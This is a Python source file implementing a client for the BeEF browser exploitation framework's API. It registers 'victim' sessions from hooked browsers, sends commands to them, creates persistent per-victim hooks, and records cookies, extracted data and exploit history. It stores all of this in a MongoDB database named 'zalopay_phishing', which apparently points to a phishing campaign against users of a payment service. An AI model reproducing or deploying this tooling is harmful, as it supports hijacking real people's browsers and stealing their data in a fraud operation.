"""
BeEF API Client
Integration with BeEF (Browser Exploitation Framework)
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import requests
import threading

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BeEFConfig:
    """BeEF configuration"""

    def __init__(self):
        self.api_url = os.getenv("BEEF_API_URL", "http://localhost:3000/api")
        self.api_token = os.getenv("BEEF_API_TOKEN")
        self.username = os.getenv("BEEF_USERNAME", "beef")
        self.password = os.getenv("BEEF_PASSWORD", "beef")
        self.hook_url = os.getenv("BEEF_HOOK_URL", "http://localhost:3000/hook.js")
        self.enable_ssl = os.getenv("BEEF_ENABLE_SSL", "false").lower() == "true"
        self.request_timeout = int(os.getenv("BEEF_REQUEST_TIMEOUT", "30"))
        self.max_retries = int(os.getenv("BEEF_MAX_RETRIES", "3"))
        self.retry_delay = float(os.getenv("BEEF_RETRY_DELAY", "1.0"))

class BeEFSession:
    """BeEF session data container"""

    def __init__(self, session_id: str, victim_id: str = None, hook_session_id: str = None):
        self.session_id = session_id
        self.victim_id = victim_id
        self.hook_session_id = hook_session_id
        self.created_at = datetime.now(timezone.utc)
        self.last_seen = datetime.now(timezone.utc)
        self.is_active = True

        # Session details
        self.ip_address = None
        self.user_agent = None
        self.browser_info = {}
        self.plugins = []
        self.cookies = {}

        # Exploitation data
        self.exploited_commands = []
        self.vulnerabilities = []
        self.extracted_data = {}

        # Status tracking
        self.command_count = 0
        self.successful_commands = 0
        self.failed_commands = 0

    def update_activity(self):
        """Update last seen timestamp"""
        self.last_seen = datetime.now(timezone.utc)

    def add_command_result(self, command: str, success: bool, result: Any = None):
        """Add command execution result"""
        self.exploited_commands.append({
            "command": command,
            "success": success,
            "result": result,
            "executed_at": datetime.now(timezone.utc).isoformat()
        })

        self.command_count += 1
        if success:
            self.successful_commands += 1
        else:
            self.failed_commands += 1

    def is_expired(self, timeout_minutes: int = 30) -> bool:
        """Check if session is expired"""
        time_diff = datetime.now(timezone.utc) - self.last_seen
        return time_diff.total_seconds() > (timeout_minutes * 60)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            "session_id": self.session_id,
            "victim_id": self.victim_id,
            "hook_session_id": self.hook_session_id,
            "created_at": self.created_at.isoformat(),
            "last_seen": self.last_seen.isoformat(),
            "is_active": self.is_active,
            "ip_address": self.ip_address,
            "user_agent": self.user_agent,
            "browser_info": self.browser_info,
            "plugins": self.plugins,
            "cookies": self.cookies,
            "exploited_commands": self.exploited_commands,
            "vulnerabilities": self.vulnerabilities,
            "extracted_data": self.extracted_data,
            "command_count": self.command_count,
            "successful_commands": self.successful_commands,
            "failed_commands": self.failed_commands
        }

class BeEFAPIClient:
    """BeEF API client"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = BeEFConfig()
        self.auth_token = None
        self.sessions: Dict[str, BeEFSession] = {}

        # Initialize authentication
        self._authenticate()

        # Start session cleanup thread
        self._start_cleanup_thread()

    def _authenticate(self) -> bool:
        """Authenticate with BeEF API"""
        try:
            auth_data = {
                "username": self.config.username,
                "password": self.config.password
            }

            response = requests.post(
                f"{self.config.api_url}/admin/login",
                json=auth_data,
                timeout=self.config.request_timeout
            )

            if response.status_code == 200:
                auth_result = response.json()
                self.auth_token = auth_result.get("token")

                if self.auth_token:
                    logger.info("Successfully authenticated with BeEF API")
                    return True

            logger.error(f"BeEF authentication failed: {response.status_code}")
            return False

        except Exception as e:
            logger.error(f"Error authenticating with BeEF: {e}")
            return False

    def _start_cleanup_thread(self):
        """Start session cleanup thread"""
        cleanup_thread = threading.Thread(target=self._cleanup_loop, daemon=True)
        cleanup_thread.start()

    def _cleanup_loop(self):
        """Session cleanup loop"""
        while True:
            try:
                time.sleep(300)  # Clean up every 5 minutes
                self._cleanup_expired_sessions()
            except Exception as e:
                logger.error(f"Error in cleanup loop: {e}")

    def _cleanup_expired_sessions(self):
        """Clean up expired sessions"""
        expired_sessions = []

        for session_id, session in self.sessions.items():
            if session.is_expired():
                expired_sessions.append(session_id)

        for session_id in expired_sessions:
            del self.sessions[session_id]

        if expired_sessions:
            logger.info(f"Cleaned up {len(expired_sessions)} expired BeEF sessions")

    def _make_api_request(self, method: str, endpoint: str, data: Dict[str, Any] = None) -> Dict[str, Any]:
        """Make authenticated API request to BeEF"""
        try:
            if not self.auth_token:
                return {"success": False, "error": "Not authenticated"}

            headers = {
                "Authorization": f"Token {self.auth_token}",
                "Content-Type": "application/json"
            }

            url = f"{self.config.api_url}{endpoint}"

            response = requests.request(
                method=method,
                url=url,
                headers=headers,
                json=data,
                timeout=self.config.request_timeout
            )

            if response.status_code == 401:
                # Token expired, try to re-authenticate
                if self._authenticate():
                    # Retry request
                    return self._make_api_request(method, endpoint, data)
                else:
                    return {"success": False, "error": "Re-authentication failed"}

            elif response.status_code >= 200 and response.status_code < 300:
                return {
                    "success": True,
                    "data": response.json() if response.content else {},
                    "status_code": response.status_code
                }

            else:
                return {
                    "success": False,
                    "error": f"API request failed: {response.status_code}",
                    "status_code": response.status_code
                }

        except Exception as e:
            logger.error(f"Error making BeEF API request: {e}")
            return {"success": False, "error": str(e)}

    def register_victim_session(self, victim_id: str, hook_session_id: str,
                               ip_address: str = None, user_agent: str = None) -> str:
        """
        Register victim session in BeEF

        Args:
            victim_id: Victim identifier
            hook_session_id: BeEF hook session ID
            ip_address: Victim IP address
            user_agent: Victim user agent

        Returns:
            Session ID
        """
        try:
            session_id = f"beef_{victim_id}_{int(time.time())}"

            # Create session
            session = BeEFSession(session_id, victim_id, hook_session_id)
            session.ip_address = ip_address
            session.user_agent = user_agent

            self.sessions[session_id] = session

            # Register in BeEF
            registration_data = {
                "session_id": hook_session_id,
                "victim_id": victim_id,
                "ip_address": ip_address,
                "user_agent": user_agent
            }

            result = self._make_api_request(
                "POST",
                "/hooks",
                registration_data
            )

            if result["success"]:
                logger.info(f"Victim session registered in BeEF: {session_id}")
                return session_id
            else:
                logger.error(f"Failed to register session in BeEF: {result.get('error')}")
                return None

        except Exception as e:
            logger.error(f"Error registering victim session: {e}")
            return None

    def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get BeEF session information"""
        try:
            result = self._make_api_request(
                "GET",
                f"/hooks/{session_id}"
            )

            if result["success"]:
                session_data = result["data"]

                # Update our session data
                if session_id in self.sessions:
                    session = self.sessions[session_id]
                    session.update_activity()

                    # Update browser info
                    if "browser" in session_data:
                        session.browser_info.update(session_data["browser"])
                    if "plugins" in session_data:
                        session.plugins = session_data["plugins"]

                return {
                    "success": True,
                    "session_data": session_data,
                    "our_session": self.sessions.get(session_id, {}).to_dict() if session_id in self.sessions else None
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting session info: {e}")
            return {"success": False, "error": str(e)}

    def execute_command(self, session_id: str, command: str, command_data: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Execute command on hooked browser

        Args:
            session_id: BeEF session ID
            command: Command to execute
            command_data: Command parameters

        Returns:
            Command execution result
        """
        try:
            if session_id not in self.sessions:
                return {"success": False, "error": "Session not found"}

            session = self.sessions[session_id]

            # Prepare command data
            command_payload = {
                "command": command,
                "data": command_data or {}
            }

            # Execute command via BeEF API
            result = self._make_api_request(
                "POST",
                f"/hooks/{session.hook_session_id}/commands",
                command_payload
            )

            if result["success"]:
                # Record command execution
                session.add_command_result(command, True, result["data"])

                logger.info(f"Command executed successfully: {command} on session {session_id}")
                return {
                    "success": True,
                    "command_id": result["data"].get("command_id"),
                    "result": result["data"]
                }
            else:
                # Record failed command
                session.add_command_result(command, False, result.get("error"))

                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {"success": False, "error": str(e)}

    def get_command_results(self, session_id: str, command_id: str = None) -> Dict[str, Any]:
        """Get command execution results"""
        try:
            if session_id not in self.sessions:
                return {"success": False, "error": "Session not found"}

            session = self.sessions[session_id]

            # Get results from BeEF API
            endpoint = f"/hooks/{session.hook_session_id}/commands"
            if command_id:
                endpoint += f"/{command_id}"

            result = self._make_api_request("GET", endpoint)

            if result["success"]:
                return {
                    "success": True,
                    "results": result["data"]
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting command results: {e}")
            return {"success": False, "error": str(e)}

    def get_available_commands(self) -> Dict[str, Any]:
        """Get available BeEF commands"""
        try:
            result = self._make_api_request("GET", "/modules")

            if result["success"]:
                return {
                    "success": True,
                    "commands": result["data"]
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting available commands: {e}")
            return {"success": False, "error": str(e)}

    def create_persistent_hook(self, victim_id: str, hook_url: str = None) -> Dict[str, Any]:
        """
        Create persistent hook for victim

        Args:
            victim_id: Victim identifier
            hook_url: Custom hook URL

        Returns:
            Hook creation result
        """
        try:
            hook_url = hook_url or self.config.hook_url

            # Generate unique hook URL for victim
            victim_hook_url = f"{hook_url}?victim_id={victim_id}"

            # Create hook in BeEF
            hook_data = {
                "victim_id": victim_id,
                "hook_url": victim_hook_url,
                "persistent": True
            }

            result = self._make_api_request(
                "POST",
                "/hooks/persistent",
                hook_data
            )

            if result["success"]:
                logger.info(f"Persistent hook created for victim: {victim_id}")
                return {
                    "success": True,
                    "hook_url": victim_hook_url,
                    "hook_id": result["data"].get("hook_id")
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error creating persistent hook: {e}")
            return {"success": False, "error": str(e)}

    def get_hook_status(self, hook_session_id: str) -> Dict[str, Any]:
        """Get hook status"""
        try:
            result = self._make_api_request(
                "GET",
                f"/hooks/{hook_session_id}/status"
            )

            if result["success"]:
                return {
                    "success": True,
                    "status": result["data"]
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error getting hook status: {e}")
            return {"success": False, "error": str(e)}

    def terminate_hook(self, hook_session_id: str) -> Dict[str, Any]:
        """Terminate BeEF hook"""
        try:
            result = self._make_api_request(
                "DELETE",
                f"/hooks/{hook_session_id}"
            )

            if result["success"]:
                # Remove from our sessions
                session_id = None
                for sid, session in self.sessions.items():
                    if session.hook_session_id == hook_session_id:
                        session_id = sid
                        session.is_active = False
                        break

                if session_id:
                    logger.info(f"Hook terminated: {hook_session_id} (session: {session_id})")

                return {
                    "success": True,
                    "message": "Hook terminated successfully"
                }
            else:
                return {
                    "success": False,
                    "error": result.get("error")
                }

        except Exception as e:
            logger.error(f"Error terminating hook: {e}")
            return {"success": False, "error": str(e)}

    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get all active BeEF sessions"""
        try:
            result = self._make_api_request("GET", "/hooks")

            if result["success"]:
                active_sessions = []

                for session_data in result["data"]:
                    hook_session_id = session_data.get("session_id")

                    # Find corresponding session in our tracking
                    our_session = None
                    for session in self.sessions.values():
                        if session.hook_session_id == hook_session_id:
                            our_session = session
                            break

                    active_sessions.append({
                        "hook_session_id": hook_session_id,
                        "victim_id": our_session.victim_id if our_session else None,
                        "our_session_id": our_session.session_id if our_session else None,
                        "ip_address": our_session.ip_address if our_session else None,
                        "last_seen": our_session.last_seen.isoformat() if our_session else None,
                        "is_active": our_session.is_active if our_session else False,
                        "command_count": our_session.command_count if our_session else 0
                    })

                return active_sessions
            else:
                return []

        except Exception as e:
            logger.error(f"Error getting active sessions: {e}")
            return []

    def get_session_statistics(self) -> Dict[str, Any]:
        """Get BeEF session statistics"""
        try:
            total_sessions = len(self.sessions)
            active_sessions = sum(1 for session in self.sessions.values() if session.is_active)

            # Command statistics
            total_commands = sum(session.command_count for session in self.sessions.values())
            successful_commands = sum(session.successful_commands for session in self.sessions.values())
            failed_commands = sum(session.failed_commands for session in self.sessions.values())

            # Success rate
            success_rate = (successful_commands / total_commands * 100) if total_commands > 0 else 0

            return {
                "total_sessions": total_sessions,
                "active_sessions": active_sessions,
                "total_commands": total_commands,
                "successful_commands": successful_commands,
                "failed_commands": failed_commands,
                "success_rate": success_rate,
                "timestamp": datetime.now(timezone.utc).isoformat()
            }

        except Exception as e:
            logger.error(f"Error getting session statistics: {e}")
            return {"error": "Failed to get statistics"}

    def save_session_to_database(self, session: BeEFSession) -> bool:
        """Save session data to MongoDB"""
        try:
            if not self.mongodb:
                return False

            session_data = session.to_dict()
            session_data["_id"] = session.session_id

            # Upsert session data
            result = self.mongodb.zalopay_phishing.beef_sessions.replace_one(
                {"_id": session.session_id},
                session_data,
                upsert=True
            )

            return result.acknowledged

        except Exception as e:
            logger.error(f"Error saving session to database: {e}")
            return False

    def load_session_from_database(self, session_id: str) -> Optional[BeEFSession]:
        """Load session data from MongoDB"""
        try:
            if not self.mongodb:
                return None

            session_data = self.mongodb.zalopay_phishing.beef_sessions.find_one(
                {"_id": session_id}
            )

            if not session_data:
                return None

            # Recreate session object
            session = BeEFSession(
                session_data["session_id"],
                session_data.get("victim_id"),
                session_data.get("hook_session_id")
            )

            # Restore session data
            session.ip_address = session_data.get("ip_address")
            session.user_agent = session_data.get("user_agent")
            session.browser_info = session_data.get("browser_info", {})
            session.plugins = session_data.get("plugins", [])
            session.cookies = session_data.get("cookies", {})
            session.exploited_commands = session_data.get("exploited_commands", [])
            session.vulnerabilities = session_data.get("vulnerabilities", [])
            session.extracted_data = session_data.get("extracted_data", {})
            session.command_count = session_data.get("command_count", 0)
            session.successful_commands = session_data.get("successful_commands", 0)
            session.failed_commands = session_data.get("failed_commands", 0)
            session.is_active = session_data.get("is_active", True)

            # Restore timestamps
            if "created_at" in session_data:
                session.created_at = datetime.fromisoformat(session_data["created_at"].replace('Z', '+00:00'))
            if "last_seen" in session_data:
                session.last_seen = datetime.fromisoformat(session_data["last_seen"].replace('Z', '+00:00'))

            return session

        except Exception as e:
            logger.error(f"Error loading session from database: {e}")
            return None

    def sync_sessions_with_database(self):
        """Sync all sessions with database"""
        try:
            for session in self.sessions.values():
                self.save_session_to_database(session)
            
            logger.info(f"Synced {len(self.sessions)} sessions with database")

        except Exception as e:
            logger.error(f"Error syncing sessions with database: {e}")

    def get_victim_exploitation_data(self, victim_id: str) -> Dict[str, Any]:
        """Get exploitation data for specific victim"""
        try:
            victim_sessions = [
                session for session in self.sessions.values()
                if session.victim_id == victim_id
            ]

            if not victim_sessions:
                return {"success": False, "error": "No sessions found for victim"}

            # Aggregate data from all sessions
            total_commands = sum(session.command_count for session in victim_sessions)
            successful_commands = sum(session.successful_commands for session in victim_sessions)
            failed_commands = sum(session.failed_commands for session in victim_sessions)

            all_extracted_data = {}
            all_vulnerabilities = []
            all_commands = []

            for session in victim_sessions:
                all_extracted_data.update(session.extracted_data)
                all_vulnerabilities.extend(session.vulnerabilities)
                all_commands.extend(session.exploited_commands)

            return {
                "success": True,
                "victim_id": victim_id,
                "session_count": len(victim_sessions),
                "total_commands": total_commands,
                "successful_commands": successful_commands,
                "failed_commands": failed_commands,
                "success_rate": (successful_commands / total_commands * 100) if total_commands > 0 else 0,
                "extracted_data": all_extracted_data,
                "vulnerabilities": all_vulnerabilities,
                "command_history": all_commands,
                "sessions": [session.to_dict() for session in victim_sessions]
            }

        except Exception as e:
            logger.error(f"Error getting victim exploitation data: {e}")
            return {"success": False, "error": str(e)}

    def export_exploitation_logs(self, session_id: str = None, victim_id: str = None) -> Dict[str, Any]:
        """Export exploitation logs for analysis"""
        try:
            export_data = {
                "export_timestamp": datetime.now(timezone.utc).isoformat(),
                "sessions": [],
                "statistics": self.get_session_statistics()
            }

            if session_id:
                # Export specific session
                if session_id in self.sessions:
                    export_data["sessions"] = [self.sessions[session_id].to_dict()]
                else:
                    return {"success": False, "error": "Session not found"}

            elif victim_id:
                # Export all sessions for victim
                victim_sessions = [
                    session for session in self.sessions.values()
                    if session.victim_id == victim_id
                ]
                export_data["sessions"] = [session.to_dict() for session in victim_sessions]

            else:
                # Export all sessions
                export_data["sessions"] = [session.to_dict() for session in self.sessions.values()]

            return {
                "success": True,
                "export_data": export_data,
                "session_count": len(export_data["sessions"])
            }

        except Exception as e:
            logger.error(f"Error exporting exploitation logs: {e}")
            return {"success": False, "error": str(e)}

# Global BeEF client instance
beef_client = None

def initialize_beef_client(mongodb_connection=None, redis_client=None) -> BeEFAPIClient:
    """Initialize global BeEF client"""
    global beef_client
    beef_client = BeEFAPIClient(mongodb_connection, redis_client)
    return beef_client

def get_beef_client() -> BeEFAPIClient:
    """Get global BeEF client"""
    if beef_client is None:
        raise ValueError("BeEF client not initialized")
    return beef_client

# Convenience functions
def register_victim_session(victim_id: str, hook_session_id: str, ip_address: str = None,
                           user_agent: str = None) -> str:
    """Register victim session (global convenience function)"""
    return get_beef_client().register_victim_session(victim_id, hook_session_id, ip_address, user_agent)

def execute_command(session_id: str, command: str, command_data: Dict[str, Any] = None) -> Dict[str, Any]:
    """Execute command (global convenience function)"""
    return get_beef_client().execute_command(session_id, command, command_data)

def get_active_sessions() -> List[Dict[str, Any]]:
    """Get active sessions (global convenience function)"""
    return get_beef_client().get_active_sessions()

def get_session_statistics() -> Dict[str, Any]:
    """Get session statistics (global convenience function)"""
    return get_beef_client().get_session_statistics()

def create_persistent_hook(victim_id: str, hook_url: str = None) -> Dict[str, Any]:
    """Create persistent hook (global convenience function)"""
    return get_beef_client().create_persistent_hook(victim_id, hook_url)

def terminate_hook(hook_session_id: str) -> Dict[str, Any]:
    """Terminate hook (global convenience function)"""
    return get_beef_client().terminate_hook(hook_session_id)

# Additional convenience functions
def save_session_to_database(session: BeEFSession) -> bool:
    """Save session data to MongoDB (global convenience function)"""
    return get_beef_client().save_session_to_database(session)

def load_session_from_database(session_id: str) -> Optional[BeEFSession]:
    """Load session data from MongoDB (global convenience function)"""
    return get_beef_client().load_session_from_database(session_id)

def get_victim_exploitation_data(victim_id: str) -> Dict[str, Any]:
    """Get exploitation data for specific victim (global convenience function)"""
    return get_beef_client().get_victim_exploitation_data(victim_id)

def export_exploitation_logs(session_id: str = None, victim_id: str = None) -> Dict[str, Any]:
    """Export exploitation logs for analysis (global convenience function)"""
    return get_beef_client().export_exploitation_logs(session_id, victim_id)